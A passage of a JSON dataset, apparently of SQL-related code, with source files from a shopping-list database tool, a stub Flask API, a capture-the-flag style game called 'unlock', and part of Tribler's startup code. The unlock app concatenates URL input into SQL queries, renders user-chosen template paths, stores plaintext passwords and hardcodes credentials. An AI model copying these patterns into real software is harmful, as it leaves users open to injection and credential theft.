help='Create a new, empty database.')\n    create_parser.add_argument('-f', '--file', nargs=1, metavar='<path/file.sql>', dest='inputfile', help='Create a new database and import contents from <path/file.sql>.')\n    create_parser.add_argument('-d', '--dump', nargs=1, metavar='<path/file.sql>', dest='dumpfile', help='Create a dump of database contents to <path/file.sql>.')\n\n    # Subparser for adding items\n    add_parser = subparsers.add_parser('add', help='subcommands to add items to tables');\n    add_parser.add_argument('--item', nargs=2, metavar=('\"<name>\"', '<list id>'), help='Add new item <name>. <list id> is either a shopping list id or 0, which means the item available for all lists.')\n    add_parser.add_argument('--lang', nargs=1, metavar='\"<language>\"', help='Add new language for item translations.')\n    add_parser.add_argument('--trid', nargs=3, metavar=('<item id>', '<language id>', '\"<translation>\"'), dest='translationid', help='Add new translation for an item <item id> to language <language id>. Translated string is \"<translation>\".')\n    add_parser.add_argument('--trname', nargs=3, metavar=('\"<item name>\"', '<language id>', '\"<translation>\"'), dest='translationname', help='Add new translation for an item \"<item name>\" to language <language id>. Translated string is \"<translation>\".')\n    add_parser.add_argument('--store', nargs=1, metavar='\"<store name>\"', help='Add new store <store name>.')\n\n    # Subparser for finding and listing table items\n    list_parser = subparsers.add_parser('list', help='subcommands for finding and listing database items');\n    list_parser.add_argument('--allitems', nargs=1, metavar='<language id>', help='List all available items and their translations for the given language.')\n    list_parser.add_argument('--itemname', nargs=2, metavar=('\"<item name>\"', '<language id>'), help='Find items and their translations by their name for the given language.')\n    list_parser.add_argument('--itemid', nargs=2, metavar=('<item id>', '<language id>'), help='Find items and their translations by their ids.')\n\n    args = ap.parse_args()\n\n    print(args) #  debug\n\n    db = EcoDB(args.database[0])\n\n\n    # Arguments are parsed, do the required tasks.\n\n    # create new, empty database\n    if hasattr(args, 'empty'):\n        if args.empty:\n            db.create_empty_database();\n\n    # dump contents of the database\n    if hasattr(args, 'dumpfile'):\n        if args.dumpfile:\n            db.dump_database(args.dumpfile);\n\n    # create and input contents of the database according to an sql file\n    if hasattr(args, 'inputfile'):\n        if args.inputfile:\n            db.import_database(args.inputfile);\n\n    # add new item\n    if hasattr(args, 'item'):\n        if args.item:\n            db.add_item(args.item)\n            #print('new item: %u %s %u' % (index[0], index[1], index[2]))\n\n    # add new translation language\n    if hasattr(args, 'lang'):\n        if args.lang:\n            db.add_language(args.lang)\n\n    # add new translation for an item id\n    if hasattr(args, 'translationid'):\n        if args.translationid:\n            db.add_translation(args.translationid)\n\n    # add new translation for an item name\n    if hasattr(args, 'translationname'):\n        if args.translationname:\n            db.add_translationname(args.translationname)\n            \n    # add new store\n    if hasattr(args, 'store'):\n        if args.store:\n            db.add_store(args.store)\n\n    # list all items and their translations for the given language\n    if hasattr(args, 'allitems'):\n        if args.allitems:\n            for an_item in db.find_all_items(args.allitems):\n                print(an_item)\n\n    # list items and their translations by their name for the given language\n    if hasattr(args, 'itemname'):\n        if args.itemname:\n            for an_item in db.find_item_name(args.itemname):\n                print(an_item)\n\n    # list items and their translations by their id for the given language\n    if hasattr(args, 'itemid'):\n        if args.itemid:\n            for an_item in db.find_item_id(args.itemid):\n                print(an_item)\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/d3QUone/db_api/blob/c56a154accce675974453e01ff500bbe6f7887e0",
        "file_path": "/app.py",
        "source": "__author__ = 'vladimir'\n\nfrom flask import Flask\nimport ujson\n\nfrom blueprints.database import FuckingCoolORM\nfrom blueprints.forum import forum\nfrom blueprints.post import post\nfrom blueprints.user import user\nfrom blueprints.thread import thread\n\n\nBASE_URL = \"/db/api\"\n\n\napp = Flask(\"db-api\")\napp.config[\"DEBUG\"] = True\n\napp.register_blueprint(forum, url_prefix=BASE_URL)\napp.register_blueprint(post, url_prefix=BASE_URL)\napp.register_blueprint(user, url_prefix=BASE_URL)\napp.register_blueprint(thread, url_prefix=BASE_URL)\n\n\n@app.route(BASE_URL + \"/status\", methods=[\"GET\"])\ndef status():\n    res = {\n        \"forum\": FuckingCoolORM.Instance().get_count(\"forum_t\"),\n        \"post\": FuckingCoolORM.Instance().get_count(\"post_t\"),\n        \"user\": FuckingCoolORM.Instance().get_count(\"user_t\"),\n        \"thread\": FuckingCoolORM.Instance().get_count(\"thread_t\"),\n    }\n    return ujson.dumps({\"code\": 0, \"response\": res})\n\n\ndef debug_printout():\n    res = \"\"\n    for i in app.url_map.iter_rules():\n        res += \"  {0}\\n\".format(i)\n    return \"Current routes:\\n\\n\" + res + \"\\n\" + \"-\"*50\n\n\nif __name__ == \"__main__\":\n    print debug_printout()\n    app.run(\"127.0.0.1\", port=8080)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/d3QUone/db_api/blob/c56a154accce675974453e01ff500bbe6f7887e0",
        "file_path": "/blueprints/database.py",
        "source": "__author__ = 'vladimir'\n\nimport pymysql\n\n\n# TODO: do as decorator\ndef safe_injection(string):\n    \"\"\"\n    remove \" ' etc ...\n    \"\"\"\n    return string\n\n\n# 'Singleton' stolen from http://stackoverflow.com/questions/31875/is-there-a-simple-elegant-way-to-define-singletons-in-python\nclass Singleton:\n    \"\"\"\n    A non-thread-safe helper class to ease implementing singletons.\n    This should be used as a decorator -- not a metaclass -- to the\n    class that should be a singleton.\n\n    The decorated class can define one `__init__` function that\n    takes only the `self` argument. Other than that, there are\n    no restrictions that apply to the decorated class.\n\n    To get the singleton instance, use the `Instance` method. Trying\n    to use `__call__` will result in a `TypeError` being raised.\n\n    Limitations: The decorated class cannot be inherited from.\n    \"\"\"\n    def __init__(self, decorated):\n        self._decorated = decorated\n\n    def Instance(self):\n        \"\"\"\n        Returns the singleton instance. Upon its first call, it creates a\n        new instance of the decorated class and calls its `__init__` method.\n        On all subsequent calls, the already created instance is returned.\n\n        \"\"\"\n        try:\n            return self._instance\n        except AttributeError:\n            self._instance = self._decorated()\n            return self._instance\n\n    def __call__(self):\n        raise TypeError('Singletons must be accessed through `Instance()`.')\n\n    def __instancecheck__(self, inst):\n        return isinstance(inst, self._decorated)\n\n\n@Singleton\nclass FuckingCoolORM(object):\n\n    def __init__(self):\n        # self.connection = pymysql.connect(\n        #     host='localhost',\n        #     user='user',\n        #     password='passwd',\n        #     db='db',\n        #     charset='utf8mb4',\n        #     cursorclass=pymysql.cursors.DictCursor\n        # )\n        pass\n\n    def get_count(self, db_table):\n        # with self.connection.cursor() as cursor:\n        #     sql = \"\"\"SELECT count(*) FROM %s;\"\"\"\n        #     cursor.execute(sql, (db_table,))\n        #     result = cursor.fetchone()\n        #     return result\n        return 123\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/d3QUone/db_api/blob/c56a154accce675974453e01ff500bbe6f7887e0",
        "file_path": "/blueprints/forum.py",
        "source": "__author__ = 'vladimir'\n\nimport ujson\n\nfrom flask import Blueprint\n\nBASE_URL = \"/forum\"\n\nforum = Blueprint(\"forum\", __name__)\n\n\n@forum.route(BASE_URL + \"/create\", methods=[\"GET\"])\ndef create():\n    return ujson.dumps({\"success\": True})\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/d3QUone/db_api/blob/c56a154accce675974453e01ff500bbe6f7887e0",
        "file_path": "/blueprints/post.py",
        "source": "__author__ = 'vladimir'\n\nimport ujson\n\nfrom flask import Blueprint\n\nBASE_URL = \"/post\"\n\npost = Blueprint(\"post\", __name__)\n\n\n@post.route(BASE_URL + \"/create\", methods=[\"GET\"])\ndef create():\n    return ujson.dumps({\"success\": True})\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/d3QUone/db_api/blob/c56a154accce675974453e01ff500bbe6f7887e0",
        "file_path": "/blueprints/thread.py",
        "source": "__author__ = 'vladimir'\n\nimport ujson\n\nfrom flask import Blueprint\n\nBASE_URL = \"/thread\"\n\nthread = Blueprint(\"thread\", __name__)\n\n\n@thread.route(BASE_URL + \"/create\", methods=[\"GET\"])\ndef create():\n    return ujson.dumps({\"success\": True})\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/d3QUone/db_api/blob/c56a154accce675974453e01ff500bbe6f7887e0",
        "file_path": "/blueprints/user.py",
        "source": "__author__ = 'vladimir'\n\nimport ujson\n\nfrom flask import Blueprint\n\nBASE_URL = \"/user\"\n\nuser = Blueprint(\"user\", __name__)\n\n\n@user.route(BASE_URL + \"/create\", methods=[\"GET\"])\ndef create():\n    return ujson.dumps({\"success\": True})\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/brocksmith225/unlock/blob/03016108548794e17bcc7a07bcc8247961c18291",
        "file_path": "/app.py",
        "source": "#!/usr/bin/env python\nfrom flask import Flask, render_template, request, redirect, url_for\nfrom flask_login import LoginManager, login_user, current_user, logout_user, login_required\nfrom flask_sqlalchemy import SQLAlchemy, sqlalchemy\nfrom flask.ext.socketio import emit, SocketIO\nimport os, uuid, psycopg2\n\napp = Flask(__name__, template_folder='pages')\nlogin_manager = LoginManager()\nlogin_manager.init_app(app);\napp.config[\"SQLALCHEMY_DATABASE_URI\"] = \"postgresql://ubuntu:Unl0ck@localhost/unlock\"\napp.config[\"SECRET_KEY\"] = \"something unique and secret\"\ndb = SQLAlchemy(app)\nsocketIO = SocketIO(app)\nurl_prefix = \"https://capstone-brocksmith225.c9users.io/\"\n\n\n\n\n\n\n#-----USER ACCOUNT SET-UP-----#\nclass User(db.Model):\n    \n    __tablename__ = \"unlock_users\"\n    \n    email = db.Column(db.String(40), unique=True, primary_key=True)\n    pwd = db.Column(db.String(64))\n    progress = db.Column(db.Integer, default=1)\n    level1_progress = db.Column(db.Integer, default=0)\n    level2_progress = db.Column(db.Integer, default=0)\n    level3_progress = db.Column(db.Integer, default=0)\n    level4_progress = db.Column(db.Integer, default=0)\n    authenticated = db.Column(db.Boolean, default=False)\n    difficulty = db.Column(db.Integer, default=0)\n\n    def is_active(self):\n        return True\n    \n    def is_authenticated(self):\n        return self.authenticated\n        \n    def is_anonymous(self):\n        return False\n    \n    def get_id(self):\n        return self.email\n        \n    @staticmethod\n    def get(user_id):\n        return 1\n        \nclass BMailUser(db.Model):\n    \n    __tablename__ = \"bmail_users\"\n    \n    account = db.Column(db.String(40), unique=True, primary_key=True)\n    pwd = db.Column(db.String(64))\n\n    def is_active(self):\n        return True\n    \n    def is_authenticated(self):\n        return self.authenticated\n        \n    def is_anonymous(self):\n        return False\n    \n    def get_id(self):\n        return self.account\n        \n    @staticmethod\n    def get(user_id):\n        return 1\n        \ndb.create_all()\ndb.session.commit()\n\n@login_manager.user_loader\ndef load_user(user_id):\n    return User.query.get(user_id)\n#-----END USER ACCOUNT FUNCTIONALITY-----#\n    \n    \n    \n\n\n#-----BASE WEBSITE FUNCTIONALITY-----#\n@app.route(\"/\")\ndef opening():\n    try:\n        if current_user.is_authenticated():\n            return render_template(\"menu.html\", progress=current_user.progress, level1_progress=current_user.level1_progress, level2_progress=current_user.level2_progress, level3_progress=current_user.level3_progress, level4_progress=current_user.level4_progress)\n        return render_template(\"opening.html\")\n    except Exception:\n        pass\n    return render_template(\"opening.html\")\n    \n@app.route(\"/create-account\", methods=[\"POST\"])\ndef createAccount():\n    pwd = request.form[\"password\"]\n    email = request.form[\"email\"]\n    difficulty = request.form[\"difficulty\"]\n    user = User(email=email, pwd=pwd, difficulty=difficulty)\n    db_user = User.query.get(email)\n    if db_user:\n        return render_template(\"login.html\", success=False)\n    user.authenticated = True\n    db.session.add(user)\n    db.session.commit()\n    login_user(user, remember=True)\n    return redirect(url_prefix)\n    \n@app.route(\"/login\", methods=[\"POST\"])\ndef login():\n    user = User.query.get(request.form[\"email\"])\n    if user:\n        if request.form[\"password\"] == user.pwd:\n            user.authenticated = True\n            db.session.add(user)\n            db.session.commit()\n            login_user(user, remember=True)\n            return redirect(url_prefix)\n    return render_template(\"unsuccessful-login.html\")\n    \n@app.route(\"/tutorial\")\n@login_required\ndef tutorial():\n    return \"\"\n\n@app.route(\"/logout\")\ndef logout():\n    user = current_user\n    user.authenticated = False\n    db.session.add(user)\n    db.session.commit()\n    logout_user()\n    return \"logged out\"\n#-----END BASE WEBSITE FUNCTIONALITY-----#\n\n   \n\n\n\n#-----UI FUNCTIONALITY-----#\n@app.route(\"/level-1\")\n@login_required\ndef level1():\n    if int(current_user.progress) >= 1:\n        return render_template(\"ui.html\", level=\"1\", page=\"index\", level_progress=current_user.level1_progress, max_level_progress=3)\n    return redirect(url_prefix)\n    \n@app.route(\"/level-2\")\n@login_required\ndef level2():\n    if int(current_user.progress) >= 2:\n        return render_template(\"ui.html\", level=\"2\", page=\"index\", level_progress=current_user.level2_progress, max_level_progress=4)\n    return redirect(url_prefix)\n    \n@app.route(\"/level-3\")\n@login_required\ndef level3():\n    if int(current_user.progress) >= 3:\n        return render_template(\"ui.html\", level=\"3\", page=\"index\", level_progress=current_user.level3_progress, max_level_progress=3)\n    return redirect(url_prefix)\n    \n@app.route(\"/level-4\")\n@login_required\ndef level4():\n    if int(current_user.progress) >= 4:\n        return render_template(\"ui.html\", level=\"4\", page=\"index\", level_progress=current_user.level4_progress, max_level_progress=3)\n    return redirect(url_prefix)\n\n@app.route(\"/flag-check/<level>\", methods=[\"POST\"])\ndef flagCheck(level):\n    conn = psycopg2.connect(\"dbname=unlock user=ubuntu\")\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM unlock_flags WHERE level=\" + level + \";\")\n    res = cur.fetchone()\n    cur.close()\n    conn.close()\n    if str(request.form[\"flag\"]) == str(res[1]):\n        if int(current_user.level1_progress) <= 2:\n            current_user.level1_progress = 3\n        if int(current_user.progress) <= 1:\n            current_user.progress = 2\n        db.session.commit()\n        return \"true\"\n    return \"false\"\n    \n@app.route(\"/get-hint/<level>\", methods=[\"POST\"])\ndef getHint(level):\n    conn = psycopg2.connect(\"dbname=unlock user=ubuntu\")\n    cur = conn.cursor()\n    if int(level) == 1:\n        cur.execute(\"SELECT hint FROM unlock_hints WHERE level=1 AND progress=\" + str(current_user.level1_progress) + \" AND difficulty=\" + str(current_user.difficulty) +\";\")\n        res = cur.fetchone()\n    elif int(level) == 2:\n        cur.execute(\"SELECT hint FROM unlock_hints WHERE level=2 AND progress=\" + str(current_user.level2_progress) + \" AND difficulty=\" + str(current_user.difficulty) +\";\")\n        res = cur.fetchone()\n    elif int(level) == 3:\n        cur.execute(\"SELECT hint FROM unlock_hints WHERE level=3 AND progress=\" + str(current_user.level3_progress) + \" AND difficulty=\" + str(current_user.difficulty) +\";\")\n        res = cur.fetchone()\n    elif int(level) == 4:\n        cur.execute(\"SELECT hint FROM unlock_hints WHERE level=4 AND progress=\" + str(current_user.level4_progress) + \" AND difficulty=\" + str(current_user.difficulty) +\";\")\n        res = cur.fetchone()\n    cur.close()\n    conn.close()\n    return str(res[0])\n#-----END UI FUNCTIONALITY-----#\n\n    \n    \n    \n    \n#-----FIRST LEVEL FUNCTIONALITY-----#\n@app.route(\"/level-1/index\")\n@login_required\ndef level1Index():\n    socketIO.emit(\"level-progress-update\", {\"level_progress\" : \"test\"})\n    return render_template(\"level-1/index.html\")\n\n@app.route(\"/level-1/create-account\", methods=[\"POST\"])\n@login_required\ndef level1CreateAccount():\n    pwd = request.form[\"password\"]\n    account = request.form[\"account\"]\n    user = BMailUser(account=account, pwd=pwd)\n    db_user = BMailUser.query.get(account)\n    if db_user:\n        return redirect(url_prefix + \"level-1/index\")\n    db.session.add(user)\n    db.session.commit()\n    if int(current_user.level1_progress) <= 0:\n        current_user.level1_progress = 1\n        db.session.commit()\n    return redirect(url_prefix + \"level-1/inbox?account=\" + user.account)\n\n@app.route(\"/level-1/login\", methods=[\"POST\"])\n@login_required\ndef level1Login():\n    user = BMailUser.query.get(request.form[\"account\"])\n    if user:\n        if request.form[\"password\"] == user.pwd:\n            if int(current_user.level1_progress) <= 1 and str(request.form[\"account\"]) == \"dev.team\":\n                current_user.level1_progress = 2\n                db.session.commit()\n            return redirect(url_prefix + \"level-1/inbox?account=\" + user.account)\n    return redirect(url_prefix + \"level-1/index\")\n\n@app.route(\"/level-1/inbox\")\n@login_required\ndef level1Inbox():\n    conn = psycopg2.connect(\"dbname=unlock user=ubuntu\")\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM bmail_emails;\")\n    res = cur.fetchall()\n    cur.close()\n    conn.close()\n    emails = [dict() for x in range(len(res))]\n    account = request.args.get(\"account\")\n    for i in range(len(res)-1, -1, -1):\n        if res[i][4] == account:\n            emails[i][\"title\"] = res[i][0]\n            emails[i][\"body\"] = res[i][1]\n            emails[i][\"sender\"] = res[i][2]\n            emails[i][\"tags\"] = res[i][3]\n    return render_template(\"level-1/inbox.html\", account=account, emails=emails, count=len(emails))\n\n@app.route(\"/level-1/<page>\")\n@login_required\ndef level1Subpage(page):\n    return render_template(\"level-1/\" + page + \".html\")\n    \n@app.route(\"/level-1/info\")\n@login_required\ndef info():\n    if int(current_user.progress) > 1:\n        return render_template(\"info-pages/level-1.html\")\n    return redirect(\"/\")\n#-----END FIRST LEVEL FUNCTIONALITY-----#\n\n    \n    \n    \n\n#-----SECOND LEVEL FUNCTIONALITY-----#\n@app.route(\"/level-2/index\")\n@login_required\ndef level2Index():\n    conn = psycopg2.connect(\"dbname=unlock user=ubuntu\")\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM nile_items;\")\n    res = cur.fetchall()\n    cur.close()\n    conn.close()\n    items = [dict() for x in range(len(res))]\n    for i in range(len(res)-1, -1, -1):\n        items[i][\"name\"] = res[i][0]\n        items[i][\"price\"] = res[i][1]\n        items[i][\"image\"] = res[i][2]\n    return render_template(\"level-2/index.html\", items=items, count=len(items))\n\n@app.route(\"/level-2/search\", methods=[\"POST\"])\n@login_required\ndef level2Search():\n    term = str(request.form[\"term\"])\n    conn = psycopg2.connect(\"dbname=unlock user=ubuntu\")\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM nile_items;\")\n    res = cur.fetchall()\n    cur.close()\n    conn.close()\n    items = [dict() for x in range(len(res))]\n    for i in range(len(res)-1, -1, -1):\n        if term in res[i][0] or term in res[i][3]:\n            items[i][\"name\"] = res[i][0]\n            items[i][\"price\"] = res[i][1]\n            items[i][\"image\"] = res[i][2]\n    return str(items)\n\n@app.route(\"/level-2/<page>\")\n@login_required\ndef level2Subpage(page):\n    return render_template(\"level-2/\" + page + \".html\")\n#-----END SECOND LEVEL FUNCTIONALITY-----#\n\n\n\n\n\n#-----SCREENSHOT FUNCTIONALITY-----#\n@app.route(\"/screenshot/<page>\")\n@login_required\ndef screenshot(page):\n    if current_user.email == \"brocksmith225@gmail.com\":\n        return render_template(page + \".html\")\n    return redirect(url_prefix)\n\n@app.route(\"/screenshot/<folder>/<page>\")\n@login_required\ndef screenshot2(folder, page):\n    if current_user.email == \"brocksmith225@gmail.com\":\n        return render_template(folder + \"/\" + page + \".html\")\n    return redirect(url_prefix)\n#-----END SCREENSHOT FUNCTIONALITY-----#\n\n\n\n\n\napp.run(host=\"0.0.0.0\", port=8080, debug=True)\nsocketIO.run(app)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Core/APIImplementation/LaunchManyCore.py",
        "source": "\"\"\"\nLaunchManyCore\n\nAuthor(s): Arno Bakker, Niels Zeilemaker\n\"\"\"\nfrom __future__ import absolute_import\n\nimport binascii\nimport logging\nimport os\nimport sys\nimport time\nimport time as timemod\nfrom glob import iglob\nfrom threading import Event, enumerate as enumerate_threads\nfrom traceback import print_exc\n\nfrom twisted.internet import reactor\nfrom twisted.internet.defer import Deferred, DeferredList, inlineCallbacks, succeed\nfrom twisted.internet.task import LoopingCall\nfrom twisted.internet.threads import deferToThread\nfrom twisted.python.threadable import isInIOThread\n\nfrom Tribler.Core.DownloadConfig import DownloadStartupConfig\nfrom Tribler.Core.Modules.MetadataStore.store import MetadataStore\nfrom Tribler.Core.Modules.gigachannel_manager import GigaChannelManager\nfrom Tribler.Core.Modules.payout_manager import PayoutManager\nfrom Tribler.Core.Modules.resource_monitor import ResourceMonitor\nfrom Tribler.Core.Modules.tracker_manager import TrackerManager\nfrom Tribler.Core.Modules.versioncheck_manager import VersionCheckManager\nfrom Tribler.Core.Modules.wallet.dummy_wallet import DummyWallet1, DummyWallet2\nfrom Tribler.Core.Modules.wallet.tc_wallet import TrustchainWallet\nfrom Tribler.Core.Modules.watch_folder import WatchFolder\nfrom Tribler.Core.TorrentChecker.torrent_checker import TorrentChecker\nfrom Tribler.Core.TorrentDef import TorrentDef, TorrentDefNoMetainfo\nfrom Tribler.Core.Utilities.configparser import CallbackConfigParser\nfrom Tribler.Core.Utilities.install_dir import get_lib_path\nfrom Tribler.Core.Video.VideoServer import VideoServer\nfrom Tribler.Core.simpledefs import (DLSTATUS_DOWNLOADING, DLSTATUS_SEEDING, DLSTATUS_STOPPED_ON_ERROR, NTFY_ERROR,\n                                     NTFY_FINISHED, NTFY_STARTED, NTFY_TORRENT, NTFY_TRIBLER,\n                                     STATE_START_API_ENDPOINTS, STATE_START_CREDIT_MINING,\n                                     STATE_START_LIBTORRENT, STATE_START_TORRENT_CHECKER, STATE_START_WATCH_FOLDER)\nfrom Tribler.pyipv8.ipv8.dht.provider import DHTCommunityProvider\nfrom Tribler.pyipv8.ipv8.messaging.anonymization.community import TunnelSettings\nfrom Tribler.pyipv8.ipv8.peer import Peer\nfrom Tribler.pyipv8.ipv8.peerdiscovery.churn import RandomChurn\nfrom Tribler.pyipv8.ipv8.peerdiscovery.community import DiscoveryCommunity, PeriodicSimilarity\nfrom Tribler.pyipv8.ipv8.peerdiscovery.discovery import EdgeWalk, RandomWalk\nfrom Tribler.pyipv8.ipv8.taskmanager import TaskManager\nfrom Tribler.pyipv8.ipv8_service import IPv8\n\n\nclass TriblerLaunchMany(TaskManager):\n\n    def __init__(self):\n        \"\"\" Called only once (unless we have multiple Sessions) by MainThread \"\"\"\n        super(TriblerLaunchMany, self).__init__()\n\n        self.initComplete = False\n        self.registered = False\n        self.ipv8 = None\n        self.ipv8_start_time = 0\n        self.state_cb_count = 0\n        self.previous_active_downloads = []\n        self.download_states_lc = None\n        self.get_peer_list = []\n\n        self._logger = logging.getLogger(self.__class__.__name__)\n\n        self.downloads = {}\n        self.upnp_ports = []\n\n        self.session = None\n        self.session_lock = None\n        self.sessdoneflag = Event()\n\n        self.shutdownstarttime = None\n\n        # modules\n        self.api_manager = None\n        self.watch_folder = None\n        self.version_check_manager = None\n        self.resource_monitor = None\n\n        self.category = None\n        self.peer_db = None\n        self.torrent_db = None\n        self.mypref_db = None\n        self.votecast_db = None\n        self.channelcast_db = None\n\n        self.gigachannel_manager = None\n\n        self.video_server = None\n\n        self.ltmgr = None\n        self.tracker_manager = None\n        self.torrent_checker = None\n        self.tunnel_community = None\n        self.trustchain_community = None\n        self.wallets = {}\n        self.popularity_community = None\n        self.gigachannel_community = None\n\n        self.startup_deferred = Deferred()\n\n        self.credit_mining_manager = None\n        self.market_community = None\n        self.dht_community = None\n        self.payout_manager = None\n        self.mds = None\n\n    def register(self, session, session_lock):\n        assert isInIOThread()\n        if not self.registered:\n            self.registered = True\n\n            self.session = session\n            self.session_lock = session_lock\n\n            self.tracker_manager = TrackerManager(self.session)\n\n            # On Mac, we bundle the root certificate for the SSL validation since Twisted is not using the root\n            # certificates provided by the system trust store.\n            if sys.platform == 'darwin':\n                os.environ['SSL_CERT_FILE'] = os.path.join(get_lib_path(), 'root_certs_mac.pem')\n\n            if self.session.config.get_video_server_enabled():\n                self.video_server = VideoServer(self.session.config.get_video_server_port(), self.session)\n                self.video_server.start()\n\n            # IPv8\n            if self.session.config.get_ipv8_enabled():\n                from Tribler.pyipv8.ipv8.configuration import get_default_configuration\n                ipv8_config = get_default_configuration()\n                ipv8_config['port'] = self.session.config.get_ipv8_port()\n                ipv8_config['address'] = self.session.config.get_ipv8_address()\n                ipv8_config['overlays'] = []\n                ipv8_config['keys'] = []  # We load the keys ourselves\n\n                if self.session.config.get_ipv8_bootstrap_override():\n                    import Tribler.pyipv8.ipv8.community as community_file\n                    community_file._DEFAULT_ADDRESSES = [self.session.config.get_ipv8_bootstrap_override()]\n                    community_file._DNS_ADDRESSES = []\n\n                self.ipv8 = IPv8(ipv8_config, enable_statistics=self.session.config.get_ipv8_statistics())\n\n                self.session.config.set_anon_proxy_settings(2, (\"127.0.0.1\",\n                                                                self.session.\n                                                                config.get_tunnel_community_socks5_listen_ports()))\n\n        if not self.initComplete:\n            self.init()\n\n        self.session.add_observer(self.on_tribler_started, NTFY_TRIBLER, [NTFY_STARTED])\n        self.session.notifier.notify(NTFY_TRIBLER, NTFY_STARTED, None)\n        return self.startup_deferred\n\n    def on_tribler_started(self, subject, changetype, objectID, *args):\n        reactor.callFromThread(self.startup_deferred.callback, None)\n\n    def load_ipv8_overlays(self):\n        if self.session.config.get_testnet():\n            peer = Peer(self.session.trustchain_testnet_keypair)\n        else:\n            peer = Peer(self.session.trustchain_keypair)\n        discovery_community = DiscoveryCommunity(peer, self.ipv8.endpoint, self.ipv8.network)\n        discovery_community.resolve_dns_bootstrap_addresses()\n        self.ipv8.overlays.append(discovery_community)\n        self.ipv8.strategies.append((RandomChurn(discovery_community), -1))\n        self.ipv8.strategies.append((PeriodicSimilarity(discovery_community), -1))\n        self.ipv8.strategies.append((RandomWalk(discovery_community), 20))\n\n        # TrustChain Community\n        if self.session.config.get_trustchain_enabled():\n            from Tribler.pyipv8.ipv8.attestation.trustchain.community import TrustChainCommunity, \\\n                TrustChainTestnetCommunity\n\n            community_cls = TrustChainTestnetCommunity if self.session.config.get_testnet() else TrustChainCommunity\n            self.trustchain_community = community_cls(peer, self.ipv8.endpoint,\n                                                      self.ipv8.network,\n                                                      working_directory=self.session.config.get_state_dir())\n            self.ipv8.overlays.append(self.trustchain_community)\n            self.ipv8.strategies.append((EdgeWalk(self.trustchain_community), 20))\n\n            tc_wallet = TrustchainWallet(self.trustchain_community)\n            self.wallets[tc_wallet.get_identifier()] = tc_wallet\n\n        # DHT Community\n        if self.session.config.get_dht_enabled():\n            from Tribler.pyipv8.ipv8.dht.discovery import DHTDiscoveryCommunity\n\n            self.dht_community = DHTDiscoveryCommunity(peer, self.ipv8.endpoint, self.ipv8.network)\n            self.ipv8.overlays.append(self.dht_community)\n            self.ipv8.strategies.append((RandomWalk(self.dht_community), 20))\n\n        # Tunnel Community\n        if self.session.config.get_tunnel_community_enabled():\n            from Tribler.community.triblertunnel.community import TriblerTunnelCommunity, TriblerTunnelTestnetCommunity\n            from Tribler.community.triblertunnel.discovery import GoldenRatioStrategy\n            community_cls = TriblerTunnelTestnetCommunity if self.session.config.get_testnet() else \\\n                TriblerTunnelCommunity\n\n            random_slots = self.session.config.get_tunnel_community_random_slots()\n            competing_slots = self.session.config.get_tunnel_community_competing_slots()\n\n            dht_provider = DHTCommunityProvider(self.dht_community, self.session.config.get_ipv8_port())\n            settings = TunnelSettings()\n            settings.min_circuits = 3\n            settings.max_circuits = 10\n            self.tunnel_community = community_cls(peer, self.ipv8.endpoint, self.ipv8.network,\n                                                  tribler_session=self.session,\n                                                  dht_provider=dht_provider,\n                                                  bandwidth_wallet=self.wallets[\"MB\"],\n                                                  random_slots=random_slots,\n                                                  competing_slots=competing_slots,\n                                                  settings=settings)\n            self.ipv8.overlays.append(self.tunnel_community)\n            self.ipv8.strategies.append((RandomWalk(self.tunnel_community), 20))\n            self.ipv8.strategies.append((GoldenRatioStrategy(self.tunnel_community), -1))\n\n        # Market Community\n        if self.session.config.get_market_community_enabled() and self.session.config.get_dht_enabled():\n            from Tribler.community.market.community import MarketCommunity, MarketTestnetCommunity\n\n            community_cls = MarketTestnetCommunity if self.session.config.get_testnet() else MarketCommunity\n            self.market_community = community_cls(peer, self.ipv8.endpoint, self.ipv8.network,\n                                                  tribler_session=self.session,\n                                                  trustchain=self.trustchain_community,\n                                                  dht=self.dht_community,\n                                                  wallets=self.wallets,\n                                                  working_directory=self.session.config.get_state_dir(),\n                                                  record_transactions=self.session.config.get_record_transactions())\n\n            self.ipv8.overlays.append(self.market_community)\n\n            self.ipv8.strategies.append((RandomWalk(self.market_community), 20))\n\n        # Popular Community\n        if self.session.config.get_popularity_community_enabled():\n            from Tribler.community.popularity.community import PopularityCommunity\n\n            self.popularity_community = PopularityCommunity(peer, self.ipv8.endpoint, self.ipv8.network,\n                                                            metadata_store=self.session.lm.mds, session=self.session)\n\n            self.ipv8.overlays.append(self.popularity_community)\n\n            self.ipv8.strategies.append((RandomWalk(self.popularity_community), 20))\n\n            self.popularity_community.start()\n\n        # Gigachannel Community\n        if self.session.config.get_chant_enabled():\n            from Tribler.community.gigachannel.community import GigaChannelCommunity, GigaChannelTestnetCommunity\n            from Tribler.community.gigachannel.sync_strategy import SyncChannels\n\n            community_cls = GigaChannelTestnetCommunity if self.session.config.get_testnet() else GigaChannelCommunity\n            self.gigachannel_community = community_cls(peer, self.ipv8.endpoint, self.ipv8.network, self.mds)\n\n            self.ipv8.overlays.append(self.gigachannel_community)\n\n            self.ipv8.strategies.append((RandomWalk(self.gigachannel_community), 20))\n            self.ipv8.strategies.append((SyncChannels(self.gigachannel_community), 20))\n\n    def enable_ipv8_statistics(self):\n        if self.session.config.get_ipv8_statistics():\n            for overlay in self.ipv8.overlays:\n                self.ipv8.endpoint.enable_community_statistics(overlay.get_prefix(), True)\n\n    def init(self):\n        # Wallets\n        if self.session.config.get_bitcoinlib_enabled():\n            try:\n                from Tribler.Core.Modules.wallet.btc_wallet import BitcoinWallet, BitcoinTestnetWallet\n                wallet_path = os.path.join(self.session.config.get_state_dir(), 'wallet')\n                btc_wallet = BitcoinWallet(wallet_path)\n                btc_testnet_wallet = 